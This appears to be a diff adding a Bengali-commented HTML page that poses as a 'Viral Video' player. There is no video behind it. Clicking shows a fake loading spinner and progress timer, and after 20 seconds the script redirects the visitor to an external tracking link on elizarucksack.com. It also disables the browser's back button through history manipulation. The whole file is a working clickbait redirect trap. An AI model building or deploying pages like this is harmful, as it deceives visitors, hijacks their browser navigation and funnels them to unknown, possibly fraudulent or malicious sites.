@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Viral Video</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body, html {
+            height: 100%;
+            background: #ffffff;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .card {
+            position: relative;
+            width: 98%;
+            max-width: 500px;
+            border-radius: 28px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        .thumb {
+            width: 100%;
+            display: block;
+        }
+
+        /* ছোট + প্রফেশনাল প্লে বাটন */
+        .play {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px; height: 70px;
+            background: rgba(0,0,0,0.75);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
+            transition: all 0.3s;
+        }
+
+        .play-icon {
+            width: 0; height: 0;
+            border-left: 20px solid #fff;
+            border-top: 13px solid transparent;
+            border-bottom: 13px solid transparent;
+            margin-left: 5px;
+        }
+
+        /* ছোট + ক্লিন লোডিং স্পিনার */
+        .loader {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(0,0,0,0.1);
+            border-top: 5px solid #000;
+            border-radius: 50%;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loader.show {
+            opacity: 1;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* নতুন যোগ করা: ভিডিও কন্ট্রোল লেয়ার (শুধু দেখার জন্য) */
+        .video-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 15px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.7));
+            color: white;
+            font-size: 13px;
+            font-family: Arial, sans-serif;
+            opacity: 0;
+            transition: opacity 0.4s;
+        }
+        .video-controls.show { opacity: 1; }
+
+        .progress-bar {
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 8px 0;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #ff0000;
+            border-radius: 2px;
+            transition: width 0.1s linear;
+        }
+
+        .time-display {
+            display: flex;
+            justify-content: space-between;
+            font-weight: bold;
+        }
+
+        /* মোবাইলে আরো পারফেক্ট */
+        @media (max-width: 480px) {
+            .card { width: 99%; border-radius: 32px; }
+            .play { width: 68px; height: 68px; }
+            .play-icon { border-left-width: 19px; border-top-width: 12px; border-bottom-width: 12px; }
+            .loader { width: 58px; height: 58px; border-width: 5px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" onclick="start()">
+        <img src="https://i.ibb.co/v6VXCvBX/x.jpg" alt="Viral" class="thumb">
+
+        <!-- ছোট প্লে বাটন -->
+        <div class="play" id="playBtn">
+            <div class="play-icon"></div>
+        </div>
+
+        <!-- ছোট লোডিং -->
+        <div class="loader" id="spinner"></div>
+
+        <!-- নতুন: ভিডিও কন্ট্রোল লেয়ার (রিয়েল লুক) -->
+        <div class="video-controls" id="controls">
+            <div class="time-display">
+                <span id="currentTime">00:00</span>
+                <span>19:34</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function start() {
+            // প্লে বাটন হাইড
+            document.getElementById('playBtn').style.display = 'none';
+            // লোডার দেখাও
+            document.getElementById('spinner').classList.add('show');
+            // কন্ট্রোল লেয়ার দেখাও
+            document.getElementById('controls').classList.add('show');
+
+            // টাইমার + প্রোগ্রেস চালু
+            let seconds = 0;
+            const interval = setInterval(() => {
+                seconds++;
+                const min = String(Math.floor(seconds / 60)).padStart(2, '0');
+                const sec = String(seconds % 60).padStart(2, '0');
+                document.getElementById('currentTime').textContent = `${min}:${sec}`;
+                document.getElementById('progress').style.width = (seconds / 225 * 100) + '%'; // 225 সেকেন্ড = 03:45
+
+                if (seconds >= 20) {
+                    clearInterval(interval);
+                    window.location = "https://elizarucksack.com/cmbvaee3u?key=bf8675cf9eb76067699073a47495c1ca";
+                }
+            }, 1000);
+
+            // ব্যাক বাটন ব্লক
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => history.go(1);
+        }
+    </script>
+
+</body>
+</html>
